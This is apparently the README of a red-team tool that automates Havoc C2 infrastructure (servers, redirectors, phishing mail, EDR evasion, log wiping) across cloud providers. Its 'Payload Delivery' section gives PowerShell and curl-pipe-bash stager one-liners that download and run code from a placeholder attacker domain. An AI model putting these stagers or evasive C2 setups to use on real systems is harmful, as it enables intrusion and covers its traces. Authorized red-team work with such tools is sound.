# C2ingRed

A comprehensive automated deployment system for Havoc C2 red team infrastructure.

## Overview

C2ingRed enables rapid deployment of complete Command and Control (C2) infrastructure with advanced security hardening, EDR evasion capabilities, and operational security features. Built for professional red team operators, this tool uses Infrastructure as Code principles to efficiently set up Havoc C2 servers, redirectors, and additional components.

## Features

- **Multi-provider Support**: Azure through a cloud driver that serves every workload; AWS, Linode and FlokiNET through their transition plays. Adding a provider or a workload is a localized change; see `docs/EXTENDING.md`
- **Infrastructure Components**:
  - C2 server with Havoc C2 Framework (dev branch)
  - HTTPS redirectors with security hardening
  - Email infrastructure with DKIM/DMARC for phishing
  - Email tracking capabilities
  - Automated payload generation and delivery
  - Attack boxes (Kali Linux and custom Ubuntu)
  - **Quick Recon Box** - Streamlined reconnaissance platform (5-8 min deployment)
- **Security Features**:
  - Zero-logging configuration to minimize evidence
  - Memory protection mechanisms
  - Command history suppression
  - Secure exfiltration tunnels
  - Strong firewall configurations
  - Fail2Ban and other defensive measures
- **EDR Evasion**:
  - Sleep masking
  - Stack spoofing
  - AMSI/ETW patching
  - Indirect syscalls
  - Binary signature randomization
- **Operational Capabilities**:
  - Automated post-exploitation payload building
  - Reverse shell handler with automatic agent deployment
  - Let's Encrypt SSL certificate automation
  - Payload synchronization between C2 and redirectors
  - Port randomization for OPSEC

## Requirements

- Python 3.6+
- Ansible 2.9+
- Provider-specific credentials:
  - AWS: Access and secret keys
  - Linode: API token
  - FlokiNET: Pre-provisioned servers
- SSH keypair for server access
- Registered domain (required for Let's Encrypt certificates)

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/C2ingRed.git
cd C2ingRed

# Install requirements
pip install -r requirements.txt

# Ensure Ansible is installed
ansible --version
```

## Usage

### Azure infrastructure and quick-recon VM

The Azure flow and its smoke-test script require Python 3.12 or newer.

Choose **Tools & Utilities → Infrastructure-only VM**, then **Azure**, or run
`python3 modules/infrastructure/deploy_infrastructure.py`. The Attack Box menu
also offers Azure for its Quick Recon Box subtype. These routes create a
dedicated resource group, network, firewall, static
Standard IPv4, NIC and Ubuntu 24.04 VM with a 32-GiB StandardSSD managed disk.
SSH is allowed only from your public IPv4 /32, password login is disabled, and
normal system logs and managed boot diagnostics remain enabled.

The Azure quick-recon route reuses the provider-neutral task module to install
the workspace, nmap/DNS tools, Tor, torsocks and proxychains. Its provider owns
the durable state and deployment key, and standalone teardown uses the saved
workload identity before removing its active deployment record. Preview its
non-mutating harness with `python3 scripts/test_azure_attack_box_live.py`; run a
real deploy/repeat/SSH verification/cleanup cycle by adding `--activate`.
Kali and full attack-box subtypes are refused because the subscription has not
accepted the Kali Marketplace image terms; they are not silently mapped to
Ubuntu. Azure also serves C2, redirector, phishing, payload-server, WEBRUNNER,
Phantom and chat through the same driver; see the architecture section below.

For unattended use, run
`python3 scripts/setup_azure_automation.py --activate` once. It creates the
`c2itall-automation` service principal with Contributor access to the dedicated
subscription, stores its client ID, private certificate, tenant and subscription
in Infisical folder `homelab`, and verifies a certificate-based login. Azure routes
prefer an existing valid CLI session and automatically recover an expired or
missing session from those Infisical values. Interactive `az login` remains a
fallback when the automation identity has not been configured. Supply the region,
VM size and SSH public key explicitly. No Azure SDK package is required;
the localhost Ansible playbooks use the installed Azure CLI. Register
`Microsoft.Compute` and `Microsoft.Network` and check regional quota, policy,
image and SKU availability before deploying. See
`providers/Azure/vars.example.yaml` for non-secret configuration. The controller
does not pass other providers' credentials into Azure tasks.

Deployment intent is saved atomically with owner-only permissions under
`deployments/azure/<deployment_id>.json` before cloud creation. Repeat a deployment
with the same configuration to update its resources. Recovery uses
`python3 modules/infrastructure/deploy_infrastructure.py --teardown-id <deployment_id>`;
the same module's `--teardown-all` and main Cleanup menu also discover
these files independently of legacy logs. Cleanup refuses foreign groups and
unexpected resources, cancels active ARM provisioning, and confirms group deletion
before removing only keys generated for that deployment. Keep failed state files
for recovery; successful state is retained in `deployments/azure/archive/`.
Standalone recovery by ID is also supported through
`python3 teardown.py --deployment-id <deployment_id>` (add `--force` to skip its
confirmation). It prefers adapter state and uses legacy lookup only when no
adapter state exists. Standalone `--list`, `--select`, and `--all` also discover
adapter deployments alongside legacy logs. Matching adapter records take priority;
unreadable records or conflicting deployment IDs abort discovery before deletion.
Failed adapter cleanup never retries through legacy cleanup. Batch cleanup reports
failure through a nonzero exit status if any deployment fails.

Preview the reviewed live smoke with `python3 deploy.py --deploy --azure-smoke --dry-run`.
Run `python3 scripts/deploy_azure_smoke.py --prepare` for the reviewed commit, push,
artifact, registration and preflight steps without creating a resource group or VM.
Preparation cleans its generated key and records a preparation result; it does not
report a passed live test. Run the actual test with
`python3 deploy.py --deploy --azure-smoke --activate`, which repeats all preconditions.
Activation commits approved paths through hooks, pushes and verifies
`forgejo/public`, archives the committed source, checks a new empty target, and
tests one temporary VM in East US before cleanup. Live defaults are subscription
`cc2a66d1-67c2-47ca-856f-19a4eae52cfe` and `Standard_D2as_v4`; the script stops on
quota, image, SKU or policy failure. SSH uses a dedicated known_hosts file and
explicit `accept-new` trust on first use; changed keys are rejected. Provisioning
and validation have a 30-minute deadline, with a separate 10-minute cleanup budget.
SIGINT/SIGTERM stop controller children and trigger cleanup; SIGKILL or workstation
loss can leave resources that require the persisted-state recovery command.

The smoke test captures the subscription resource and resource-group inventory
before provisioning and requires that inventory to be restored before reporting
success. In an initially empty test subscription, it also removes the default
East US Network Watcher and its empty group if they are the only additions and
have no running operations, connection monitors, captures or flow logs. Existing
monitoring resources are preserved. Unexpected changes or shared-subscription
additions stop automatic cleanup and are reported for review. This assumes an
exclusive test subscription during automatic monitoring cleanup; Azure does not
provide an atomic inventory-and-delete operation across independent controllers.

Tools & Utilities now performs a real read-only Azure connectivity check using
the CLI's selected subscription. Configuration validation checks Azure inputs and
the public key when `providers/Azure/vars.yaml` exists; interactive configuration
does not require that file. Local key cleanup preserves keys referenced by active
infrastructure state and refuses deletion if that state cannot be read.
Infrastructure Health Check now reads the owned VM's provisioning and power
state through its adapter. The same read-only check is available as
`python3 modules/infrastructure/deploy_infrastructure.py --health`; an unhealthy
or unavailable check returns failure. An empty result means no tracked adapter
deployments, not that every cloud resource or legacy workload was checked.

### Provider and workload architecture

Providers and workloads are independent layers joined by the registry in
`utils/provider_registry.py`. `docs/EXTENDING.md` holds the step-by-step recipes.

- A **workload profile** in `modules/<module>/workload.py` states what the
  workload needs from any VM provider: inbound rules, image role, disk size,
  validation, variants, and which configuration keys its provider-neutral
  service play in `modules/<module>/service.yml` receives.
- A **cloud driver** (`utils/cloud_driver.py`) is the whole provider contract:
  plan a VM for a request, create it, report its address, keep durable state,
  prove it is gone. `utils/azure_cloud.py` is the Azure driver; it never names
  a workload.
- **Generic adapters** in `utils/vm_workloads.py` bind any driver to any
  profile for the single-VM, multi-component, scan-node and handoff shapes,
  with the recoverable lifecycle (state before creation, verified cleanup on
  failure, idempotent repeat) shared by all of them.
- A driver-backed provider's capabilities are derived from the profiles that
  exist, so it automatically serves `infrastructure`, attack box, C2,
  redirector, phishing, payload server, WEBRUNNER, Phantom and chat. Explicit
  routes that would shadow a driver workload are rejected by validation.
- AWS, Linode and FlokiNET keep their existing plays behind explicit
  transition routes. Modules use the registered route whenever one exists and
  fall back to legacy execution only where a provider explicitly retains it.
  FlokiNET is not offered for Attack Box because it has no matching play.
- Menus, the WEBRUNNER provider picker and region pools, the connectivity test,
  configuration validation, health checks, standalone teardown and the live
  harness ask the registry about providers instead of naming them. The C2
  menus list the frameworks the C2 profile declares; the attack-box module
  names only the subtype and each provider maps it to an image.

The read-only coverage audit derives its result from the same registry used
for dispatch and distinguishes native, transition, legacy-fallback, staged,
partial-variant and unsupported combinations:

```bash
python3 scripts/audit_provider_coverage.py --require-provider azure
```

Live verification of one provider/workload pair runs through
`scripts/test_provider_workload_live.py`; the per-provider inventory clients and
account inputs it uses live in `scripts/live_clouds.py`. The one-node Linode
WEBRUNNER harness `smoke_test_webrunner.py` remains preview-only unless
explicitly activated with the operator's public IPv4.

Phantom enters through the same dispatcher when c2itall launches it. Its AWS,
Linode and FlokiNET routes are unchanged, while a driver-backed provider
provisions the VM with rules derived from the selected privacy service (SSH
limited to the operator /32) and hands it to Phantom's existing hardening and
service playbooks. `python3 scripts/test_azure_phantom_live.py --activate`
deploys WireGuard on Azure, repeats against the same resources, verifies the
service and VM/NSG state over SSH and the CLI, tears down through Phantom and
requires the subscription inventory to return to its baseline. Evidence lands
under `logs/azure-phantom-live/`.

**Deploy Chat Server** reuses Phantom's Matrix + Element core, then adds
Tailscale private networking and optional `matrix-nio` bot runtime/systemd
scaffolding. It enters through the canonical `chat` workload; the chat profile
reuses the Phantom profile's rules and disk sizing. A blank Tailscale key
installs and starts `tailscaled` for later manual authentication; a supplied key
is handled with Ansible output suppression. Deployment summaries redact
passwords, auth keys and generated Matrix secrets; owner-only deployment
information remains available for recovery.

### Main Menu (Easiest Method)

Simply run:
```bash
python3 deploy.py
```

This launches the interactive main menu for deployment, providing the most user-friendly experience with guided options for all infrastructure types.

### Interactive Mode

Alternatively, you can use:
```bash
./deploy.py --interactive
```

This guides you through the deployment process with step-by-step instructions.

### Command-line Deployment

#### AWS Deployment:
```bash
./deploy.py --provider aws --aws-key YOUR_KEY --aws-secret YOUR_SECRET \
            --domain your-domain.com --aws-region us-east-1
```

#### Linode Deployment:
```bash
./deploy.py --provider linode --linode-token YOUR_TOKEN \
            --domain your-domain.com --linode-region us-east
```

#### FlokiNET Deployment (with pre-provisioned servers):
```bash
./deploy.py --provider flokinet --flokinet-redirector-ip YOUR_REDIRECTOR_IP \
            --flokinet-c2-ip YOUR_C2_IP --domain your-domain.com
```

### Deployment Options

| Option | Description |
|--------|-------------|
| `--redirector-only` | Deploy only the redirector component |
| `--c2-only` | Deploy only the C2 server component |
| `--deploy-tracker` | Deploy email tracking server |
| `--integrated-tracker` | Setup tracker on C2 server instead of separate instance |
| `--disable-history` | Disable command history on servers |
| `--secure-memory` | Enable secure memory protection features |
| `--zero-logs` | Configure zero-logging throughout infrastructure |
| `--randomize-ports` | Use randomized ports for C2 communications |
| `--ssh-after-deploy` | Automatically SSH into the server after deployment |

## Post-Deployment Steps

After successful deployment:

1. Configure DNS records for your domain:
   - `your-domain.com` → C2 server
   - `mail.your-domain.com` → C2 server
   - `cdn.your-domain.com` → Redirector (or your custom subdomain)
   - `track.your-domain.com` → Tracker (if deployed)

2. Run post-install scripts on each server:
   ```bash
   # On C2 server
   /root/Tools/post_install_c2.sh
   
   # On redirector
   /root/Tools/post_install_redirector.sh
   ```

3. Generate Havoc C2 payloads:
   ```bash
   # On C2 server
   /root/Tools/generate_havoc_payloads.sh
   ```

## Using Havoc C2

Havoc C2 Framework is installed at `/root/Tools/Havoc` on the C2 server.

### Connecting to the Teamserver

From your local machine:

```bash
# Install Havoc client (development branch)
git clone -b dev https://github.com/HavocFramework/Havoc.git
cd Havoc/Client
mkdir build && cd build
cmake -GNinja ..
ninja

# Connect to Teamserver
./havoc client --address YOUR_C2_IP:40056 --username admin --password [password]
```

The password is stored in `/root/Tools/Havoc/data/profiles/default.yaotl` on the C2 server.

### Payload Delivery

PowerShell one-liner for Windows targets:
```powershell
powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('https://cdn.your-domain.com/windows_stager.ps1')"
```

Linux one-liner:
```bash
curl -s https://cdn.your-domain.com/linux_stager.sh | bash
```

## Security Considerations

- All servers include the `/root/Tools/secure-exit.sh` script to securely wipe operational data
- The `/root/Tools/clean-logs.sh` script automatically runs to remove evidence
- Port randomization enhances OPSEC when enabled
- Set proper DKIM/DMARC records for email operations
- Consider using ephemeral infrastructure for high-risk operations

## Cleaning Up

To remove all infrastructure when finished:

```bash
./deploy.py --provider PROVIDER --teardown --deployment-id YOUR_DEPLOYMENT_ID
```

Add your provider-specific authentication arguments to remove the correct resources.

## Disclaimer

This tool is intended for authorized red team operations, penetration testing, and security research only. Always obtain proper authorization before conducting security testing. The authors are not responsible for misuse or illegal activities.
